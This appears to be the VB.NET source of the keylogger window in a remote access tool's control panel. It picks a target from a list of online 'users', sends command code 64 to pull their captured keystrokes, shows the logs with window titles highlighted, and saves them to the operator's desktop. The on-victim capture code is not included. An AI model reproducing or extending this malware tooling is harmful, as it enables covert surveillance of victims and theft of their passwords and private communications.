Imports System.Text.RegularExpressions

Public Class Keylogger

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Settings.AddLog("Pending", Settings.State.Pending, "Requesting processlist...")
        RichTextBoxKeylogs.Clear()
        If Main.ListViewMain.Items.Count > 0 Then
            If Main.ListViewMain.SelectedItems.Count <> 0 Then _
                Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
        Else
            MsgBox("No Users online.", MsgBoxStyle.Exclamation)
        End If
        Try
            Main.WriteCommand(Main.SelectedUserID & "|64")
            Waiting.ShowDialog()
        Catch x As Exception
            MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Processmanager")
        End Try
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        If System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\Keylogs.txt") Then
            Try
                System.IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\Keylogs.txt")
            Catch
            End Try
        End If
        For i As Integer = 0 To RichTextBoxKeylogs.Lines.Count - 1
            System.IO.File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\Keylogs.txt", RichTextBoxKeylogs.Lines(i) & vbNewLine)
        Next
        MsgBox("Keylogs saved to desktop.", MsgBoxStyle.Information, "Keylogs saved")
    End Sub

    Private Sub Keylogger_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        RichTextBoxKeylogs.Clear()
    End Sub


    Public Sub ColorTitles()
        Dim Point As Integer = 0
        For Each m As Match In New Regex("\[ -- (.*?) -- \]").Matches(RichTextBoxKeylogs.Text)
            Point = RichTextBoxKeylogs.Find((m.Groups(0).Value), Point, RichTextBoxFinds.None)
            RichTextBoxKeylogs.SelectionColor = Color.CadetBlue
            RichTextBoxKeylogs.SelectionFont = New Font(Font, FontStyle.Bold)
            RichTextBoxKeylogs.DeselectAll()
        Next
    End Sub


End Class